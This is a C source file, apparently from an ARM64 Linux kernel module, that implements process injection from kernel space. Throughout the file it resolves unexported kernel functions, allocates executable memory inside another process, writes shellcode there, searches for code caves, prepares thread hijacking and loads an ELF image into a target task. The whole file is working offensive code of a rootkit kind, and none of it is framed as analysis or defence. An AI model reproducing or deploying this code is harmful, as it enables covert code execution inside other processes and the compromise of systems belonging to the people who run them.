/* SPDX-License-Identifier: GPL-2.0 */
/* nvk_inject.c — implementations extracted from nvk_inject.h. */
#include <nvk.h>

int nvk_inject_init(void)
{
	if (_nvk_inject_inited) return 0;

	_nvk_do_mmap = (nvk_do_mmap_fn)NVK_LOOKUP("do_mmap");
	_nvk_vm_mmap = (nvk_vm_mmap_fn)NVK_LOOKUP("vm_mmap");
	_nvk_do_munmap = (nvk_do_munmap_fn)NVK_LOOKUP("do_munmap");
	if (!_nvk_do_munmap)
		_nvk_do_munmap = (nvk_do_munmap_fn)NVK_LOOKUP("__do_munmap");

	_nvk_inject_inited = 1;
	return (_nvk_do_mmap || _nvk_vm_mmap) ? 0 : -1;
}

long nvk_inject_write(struct task_struct *task,
			     unsigned long addr,
			     const void *data, size_t len)
{
	return nvk_vma_write_remote(task, addr, data, len);
}

long nvk_inject_read(struct task_struct *task,
			    unsigned long addr,
			    void *buf, size_t len)
{
	return nvk_vma_read_remote(task, addr, buf, len);
}

void _nvk_inject_flush_code(unsigned long addr, size_t len)
{
	unsigned long line;
	unsigned long end = addr + len;

	for (line = addr & ~63UL; line < end; line += 64)
		__asm__ __volatile__("dc civac, %0" :: "r"(line) : "memory");
	__asm__ __volatile__("dsb ish" ::: "memory");
	__asm__ __volatile__("ic iallu" ::: "memory");
	__asm__ __volatile__("dsb ish" ::: "memory");
	__asm__ __volatile__("isb" ::: "memory");
}

int nvk_inject_shellcode(struct task_struct *task,
				const struct nvk_shellcode *sc,
				unsigned long target_addr)
{
	if (!task || !sc || !sc->code) return -1;
	if (sc->insn_count <= 0 || sc->insn_count > 1024)
		return -2;

	size_t code_sz = (size_t)sc->insn_count * 4;
	long ret = nvk_inject_write(task, target_addr,
				     sc->code, code_sz);
	if (ret) return (int)ret;

	_nvk_inject_flush_code(target_addr, code_sz);
	return 0;
}

unsigned long nvk_inject_find_cave(struct task_struct *task,
					  unsigned long min_size)
{
	struct nvk_vma_info info;
	int ret = nvk_vma_find_exec(task, min_size + 0x1000, &info);
	if (ret) return 0;
	return info.end - min_size - 64;
}

void _nvk_inject_resolve_mm(void)
{
	if (!_nvk_get_task_mm) {
		_nvk_get_task_mm =
			(nvk_get_task_mm_fn)NVK_LOOKUP("get_task_mm");
		_nvk_mmput = (nvk_mmput_fn)NVK_LOOKUP("mmput");
		_nvk_mmap_wlock =
			(nvk_mmap_write_lock_fn)NVK_LOOKUP("mmap_write_lock");
		if (!_nvk_mmap_wlock)
			_nvk_mmap_wlock =
				(nvk_mmap_write_lock_fn)NVK_LOOKUP("down_write");
		_nvk_mmap_wunlock =
			(nvk_mmap_write_unlock_fn)NVK_LOOKUP("mmap_write_unlock");
		if (!_nvk_mmap_wunlock)
			_nvk_mmap_wunlock =
				(nvk_mmap_write_unlock_fn)NVK_LOOKUP("up_write");
		_nvk_use_mm =
			(nvk_use_mm_fn)NVK_LOOKUP("kthread_use_mm");
		if (!_nvk_use_mm)
			_nvk_use_mm =
				(nvk_use_mm_fn)NVK_LOOKUP("use_mm");
		_nvk_unuse_mm =
			(nvk_unuse_mm_fn)NVK_LOOKUP("kthread_unuse_mm");
		if (!_nvk_unuse_mm)
			_nvk_unuse_mm =
				(nvk_unuse_mm_fn)NVK_LOOKUP("unuse_mm");
	}
}

unsigned long nvk_inject_mmap(struct task_struct *task,
				     unsigned long len, unsigned long prot)
{
	unsigned long addr = 0;
	void *mm;

	_nvk_inject_resolve_mm();
	if (!_nvk_get_task_mm || !_nvk_do_mmap) return 0;
	if (!_nvk_use_mm || !_nvk_unuse_mm) return 0;

	mm = _nvk_get_task_mm(task);
	if (!mm) return 0;

	unsigned long flags = NVK_INJECT_MAP_PRIVATE | NVK_INJECT_MAP_ANON;
	unsigned long populate = 0;

	_nvk_use_mm(mm);
	if (_nvk_mmap_wlock) _nvk_mmap_wlock(mm);
	void *ret = _nvk_do_mmap((void *)0, 0, len, prot, flags,
				  0, &populate, (void *)0);
	if (_nvk_mmap_wunlock) _nvk_mmap_wunlock(mm);
	_nvk_unuse_mm(mm);

	if ((unsigned long)ret < 0x1000UL)
		addr = 0;
	else
		addr = (unsigned long)ret;

	if (_nvk_mmput) _nvk_mmput(mm);
	return addr;
}

int nvk_inject_munmap(struct task_struct *task,
			     unsigned long addr, size_t len)
{
	void *mm;
	int ret = -1;

	_nvk_inject_resolve_mm();
	if (!_nvk_get_task_mm || !_nvk_do_munmap) return -1;
	if (!_nvk_use_mm || !_nvk_unuse_mm) return -1;

	mm = _nvk_get_task_mm(task);
	if (!mm) return -1;

	_nvk_use_mm(mm);
	if (_nvk_mmap_wlock) _nvk_mmap_wlock(mm);
	ret = _nvk_do_munmap(mm, addr, len, (void *)0);
	if (_nvk_mmap_wunlock) _nvk_mmap_wunlock(mm);
	_nvk_unuse_mm(mm);

	if (_nvk_mmput) _nvk_mmput(mm);
	return ret;
}

int nvk_inject_hijack_setup(struct nvk_thread_hijack *hj,
				   struct task_struct *task,
				   const struct nvk_shellcode *sc)
{
	if (!hj || !task || !sc || !sc->code) return -1;
	__builtin_memset(hj, 0, sizeof(*hj));

	size_t code_sz = (size_t)sc->insn_count * 4;
	unsigned long prot = NVK_INJECT_PROT_READ | NVK_INJECT_PROT_EXEC;
	unsigned long alloc_sz = (code_sz + 0xFFF) & ~0xFFFUL;

	unsigned long code_addr = nvk_inject_mmap(task, alloc_sz, prot);
	if (!code_addr) return -2;

	long ret = nvk_inject_write(task, code_addr, sc->code, code_sz);
	if (ret) {
		nvk_inject_munmap(task, code_addr, alloc_sz);
		return -3;
	}

	_nvk_inject_flush_code(code_addr, code_sz);

	hj->code_addr = code_addr + sc->entry_offset;
	hj->code_size = alloc_sz;
	hj->active = 1;
	return 0;
}

int nvk_inject_elf(struct task_struct *task,
			  const void *elf_data, size_t elf_len,
			  struct nvk_elf_load_info *info)
{
	const struct nvk_elf64_hdr *ehdr;
	const struct nvk_elf64_phdr *phdr;
	unsigned long lo = ~0UL, hi = 0;
	int i, load_count = 0;

	if (!task || !elf_data || elf_len < sizeof(*ehdr) || !info)
		return -1;

	ehdr = (const struct nvk_elf64_hdr *)elf_data;
	if (ehdr->magic != NVK_ELF_MAGIC) return -2;
	if (ehdr->ei_class != 2) return -3;
	if (ehdr->e_type != NVK_ET_DYN) return -4;
	if (ehdr->e_phoff + (u64)ehdr->e_phnum * ehdr->e_phentsize > elf_len)
		return -5;

	phdr = (const struct nvk_elf64_phdr *)
		((const u8 *)elf_data + ehdr->e_phoff);

	for (i = 0; i < ehdr->e_phnum; i++) {
		if (phdr[i].p_type != NVK_PT_LOAD) continue;
		unsigned long seg_lo = phdr[i].p_vaddr;
		unsigned long seg_hi = seg_lo + phdr[i].p_memsz;
		if (seg_lo < lo) lo = seg_lo;
		if (seg_hi > hi) hi = seg_hi;
		load_count++;
	}

	if (load_count == 0) return -6;

	unsigned long total = ((hi - lo) + 0xFFF) & ~0xFFFUL;
	unsigned long prot = NVK_INJECT_PROT_READ | NVK_INJECT_PROT_WRITE |
			     NVK_INJECT_PROT_EXEC;
	unsigned long base = nvk_inject_mmap(task, total, prot);
	if (!base) return -7;

	for (i = 0; i < ehdr->e_phnum; i++) {
		if (phdr[i].p_type != NVK_PT_LOAD) continue;
		if (phdr[i].p_offset + phdr[i].p_filesz > elf_len) {
			nvk_inject_munmap(task, base, total);
			return -8;
		}

		unsigned long dst = base + (phdr[i].p_vaddr - lo);
		const void *src = (const u8 *)elf_data + phdr[i].p_offset;
		long ret = nvk_inject_write(task, dst, src,
					     (size_t)phdr[i].p_filesz);
		if (ret) {
			nvk_inject_munmap(task, base, total);
			return -9;
		}

		if (phdr[i].p_flags & 1)
			_nvk_inject_flush_code(dst, (size_t)phdr[i].p_filesz);
	}

	info->base = base;
	info->entry = base + (ehdr->e_entry - lo);
	info->num_segments = load_count;
	info->total_size = total;
	return 0;
}

